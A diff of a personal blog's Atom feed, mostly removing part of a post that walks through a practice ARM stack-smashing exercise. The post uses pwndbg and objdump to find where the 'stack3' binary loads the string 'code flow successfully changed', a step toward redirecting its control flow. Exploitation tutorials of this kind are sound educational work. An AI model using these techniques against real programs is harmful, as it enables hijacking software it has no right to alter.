+algorithm&lt;/a&gt;) while the
+latter is NP-complete.&lt;/p&gt;</content><author><name>Gehn</name></author><summary type="html">A small business sells two types of chocolate packs: A and B. The pack A has 300 grams of bittersweet chocolate, 500 grams of chocolate with walnuts and 200 grams of white chocolate. The pack B has 400 grams of bittersweet chocolate, 200 grams of chocolate with walnuts and 400 grams of white chocolate. The pack A has a price of 120$ while the pack B has a price of 90$. Let’s assume that this small business has for today 100 kilograms of bittersweet chocolate, 120 kilograms of chocolate with walnuts and 100 kilograms of while chocolate. How many packs of A and B type should be packed to maximize the profits?</summary></entry><entry><title type="html">Congruence Closure with Z3</title><link href="/book-of-gehn/articles/2021/04/25/Congruence-Closure.html" rel="alternate" type="text/html" title="Congruence Closure with Z3" /><published>2021-04-25T00:00:00+02:00</published><updated>2021-04-25T00:00:00+02:00</updated><id>/book-of-gehn/articles/2021/04/25/Congruence-Closure</id><content type="html" xml:base="/book-of-gehn/articles/2021/04/25/Congruence-Closure.html">&lt;p&gt;Assume that you know that &lt;script type=&quot;math/tex&quot;&gt;a = b&lt;/script&gt;, &lt;script type=&quot;math/tex&quot;&gt;b = c&lt;/script&gt; and &lt;script type=&quot;math/tex&quot;&gt;d = e&lt;/script&gt;. What can you
 tell me about the claim &lt;script type=&quot;math/tex&quot;&gt;a = c&lt;/script&gt; ? Is it true or false?&lt;!--more--&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;equivalence-class&quot;&gt;Equivalence class&lt;/h2&gt;
@@ -1877,203 +2051,4 @@ was 31 as expected.&lt;/p&gt;
 &lt;p&gt;Instead of jumping to &lt;code class=&quot;highlighter-rouge&quot;&gt;_exit&lt;/code&gt; we could jump before to a piece of code
 –known as gadget– that sets &lt;code class=&quot;highlighter-rouge&quot;&gt;r0&lt;/code&gt; to zero and then jump to &lt;code class=&quot;highlighter-rouge&quot;&gt;_exit&lt;/code&gt;.&lt;/p&gt;
 
-&lt;p&gt;But that’s for another post.&lt;/p&gt;</content><author><name>Gehn</name></author><summary type="html">Fifth challenge with a small introduction to process continuation.</summary></entry><entry><title type="html">Smashing ARM Stack for Fun - Part IV</title><link href="/book-of-gehn/articles/2021/01/19/Smashing-ARM-Stack-for-Fun-Part-IV.html" rel="alternate" type="text/html" title="Smashing ARM Stack for Fun - Part IV" /><published>2021-01-19T00:00:00+01:00</published><updated>2021-01-19T00:00:00+01:00</updated><id>/book-of-gehn/articles/2021/01/19/Smashing-ARM-Stack-for-Fun-Part-IV</id><content type="html" xml:base="/book-of-gehn/articles/2021/01/19/Smashing-ARM-Stack-for-Fun-Part-IV.html">&lt;p&gt;This time the goal is to make the program print the message
-&lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;code flow successfully changed&quot;&lt;/code&gt;.&lt;!--more--&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;a-manual-xref&quot;&gt;A manual &lt;code class=&quot;highlighter-rouge&quot;&gt;xref&lt;/code&gt;&lt;/h2&gt;
-
-&lt;p&gt;Let’s see where this message is stored:&lt;/p&gt;
-
-&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;search&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;code flow successfully changed&quot;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;stack3&lt;/span&gt;          &lt;span class=&quot;mh&quot;&gt;0x10560&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x65646f63&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/*&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flow&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;successfully&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'*/&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;stack3&lt;/span&gt;          &lt;span class=&quot;mh&quot;&gt;0x20560&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x65646f63&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/*&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flow&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;successfully&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;changed&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'*/&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;And from where the executable makes a reference to it? In other
-words, where in the code segment this address is stored?&lt;/p&gt;
-
-&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;search&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;executable&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10560&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;stack3&lt;/span&gt;          &lt;span class=&quot;mh&quot;&gt;0x10490&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10560&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;stack3&lt;/span&gt;          &lt;span class=&quot;mh&quot;&gt;0x10c6c&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10560&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;stack3&lt;/span&gt;          &lt;span class=&quot;mh&quot;&gt;0x20490&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10560&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;To summarize the message (and array of chars) is stored at 0x10560
-and the address 0x10560 is stored in 0x10490, 0x10c6c and 0x20490.&lt;/p&gt;
-
-&lt;p&gt;These addresses are the &lt;code class=&quot;highlighter-rouge&quot;&gt;char*&lt;/code&gt; that the program must load into a
-register to do a call to &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;puts&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Let’s assume that one of those addresses is loaded in a register using an
-instruction like this:&lt;/p&gt;
-
-&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;???&amp;gt;&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;offset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;It is a reasonable assumption: the rest of the challenges so far used
-this instruction.&lt;/p&gt;
-
-&lt;p&gt;We don’t know neither which register will be using nor the offset so we
-will have to guess.&lt;/p&gt;
-
-&lt;p&gt;Let’s see what we can find with &lt;code class=&quot;highlighter-rouge&quot;&gt;objdump&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;grep&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pi&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;raspberrypi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:~&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;objdump&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stack3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ldr.*r[0-9], \[pc&quot;&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;10374&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f000c&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 10388 &amp;lt;_start+0x34&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;10378&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f300c&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 1038c &amp;lt;_start+0x38&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;10390&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f3014&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 103ac &amp;lt;call_weak_fn+0x1c&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;10394&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f2014&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 103b0 &amp;lt;call_weak_fn+0x20&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;103&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f301c&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 103d8 &amp;lt;deregister_tm_clones+0x24&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;103&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f001c&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 103dc &amp;lt;deregister_tm_clones+0x28&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;103&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f3010&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 103e0 &amp;lt;deregister_tm_clones+0x2c&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;103&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f1024&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 10410 &amp;lt;register_tm_clones+0x2c&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;103&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f0024&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 10414 &amp;lt;register_tm_clones+0x30&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;10400&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f3010&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 10418 &amp;lt;register_tm_clones+0x34&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;10420&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f4018&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 10440 &amp;lt;__do_global_dtors_aux+0x24&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;10448&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f0024&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 10474 &amp;lt;frame_dummy+0x30&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;10460&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f3010&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 10478 &amp;lt;frame_dummy+0x34&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;10484&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f0004&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; 10490 &amp;lt;win+0x14&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;104&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f0018&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 104e8 &amp;lt;main+0x54&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;104&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f604c&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 10548 &amp;lt;__libc_csu_init+0x5c&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;104&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f504c&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 1054c &amp;lt;__libc_csu_init+0x60&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;These two lines are interesting:&lt;/p&gt;
-
-&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   &lt;span class=&quot;mi&quot;&gt;10484&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f0004&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;; 10490 &amp;lt;win+0x14&amp;gt;&lt;/span&gt;
-   &lt;span class=&quot;mi&quot;&gt;104&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;n&quot;&gt;e59f0018&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;ldr&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;r0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;]&lt;/span&gt;   &lt;span class=&quot;c&quot;&gt;; 104e8 &amp;lt;main+0x54&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;And the winner is 0x10484!&lt;/p&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10484&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt;
-&lt;span class=&quot;mh&quot;&gt;0x10490&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;See how 0x10484 the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;ldr&lt;/code&gt; instruction plus the offset
-&lt;code class=&quot;highlighter-rouge&quot;&gt;0x4&lt;/code&gt; plus 0x8 bytes yields an address (0x10490) that we found before, a
-&lt;code class=&quot;highlighter-rouge&quot;&gt;char*&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;If we dereference it we will see the address of the message:&lt;/p&gt;
-
-&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;pwndbg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wx&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10490&lt;/span&gt;
